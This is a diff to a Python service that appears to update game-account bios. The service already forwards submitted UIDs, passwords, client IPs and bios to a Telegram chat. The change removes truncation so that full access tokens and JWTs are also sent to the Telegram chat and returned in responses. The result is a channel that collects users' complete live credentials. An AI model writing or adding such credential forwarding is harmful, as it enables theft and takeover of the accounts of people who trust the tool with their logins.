@@ -56,6 +56,7 @@ def send_telegram_message(message):
 def format_telegram_message(request_data, response_data, error=None):
     """Build a nice-looking Telegram message with HTML tags.
        Includes UID, Password (if provided), Bio, Method, etc.
+       Now shows FULL JWT and FULL Access Token.
     """
     timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
     client_ip = request_data.get('client_ip', 'Unknown')
@@ -84,11 +85,11 @@ def format_telegram_message(request_data, response_data, error=None):
     # Show Bio
     lines.append(f"<b>Bio:</b> <code>{bio}</code>")
     
-    # Show tokens if present (truncated for readability)
+    # Show FULL tokens if present (no truncation)
     if access_token:
-        lines.append(f"<b>Access Token:</b> <code>{access_token[:30]}...</code>")
+        lines.append(f"<b>Access Token:</b> <code>{access_token}</code>")
     if jwt_token:
-        lines.append(f"<b>JWT:</b> <code>{jwt_token[:30]}...</code>")
+        lines.append(f"<b>JWT:</b> <code>{jwt_token}</code>")
     
     # Show login method
     lines.append(f"<b>Login Method:</b> {login_method}")
@@ -335,8 +336,8 @@ def combined_bio_upload():
         'uid': uid if uid else 'Not provided',
         'password': password,  # may be None
         'bio': bio if bio else 'Not provided',
-        'access_token': access_token,
-        'jwt_token': jwt_token,
+        'access_token': access_token,  # full token
+        'jwt_token': jwt_token,        # full token
         'login_method': 'Unknown'  # will be updated
     }
 
@@ -450,7 +451,7 @@ def combined_bio_upload():
         "name": jwt_info.get("name") if jwt_info else None,
         "region_detected": jwt_region,
         "region_used": mapped_region,
-        "generated_jwt": final_jwt[:50] + "..." if final_jwt and len(final_jwt) > 50 else final_jwt,
+        "generated_jwt": final_jwt,  # full JWT
         "server_response": result["server_response"][:200] if result["server_response"] else "Empty"
     }
 
@@ -458,6 +459,9 @@ def combined_bio_upload():
     request_info['login_method'] = login_method
     if jwt_info and jwt_info.get('uid'):
         request_info['uid'] = jwt_info['uid']  # override with actual UID from JWT
+
+    # Also set the full tokens in request_info for Telegram (they are already there, but ensure)
+    # No truncation now
 
     # Send success notification
     msg = format_telegram_message(request_info, response_data)
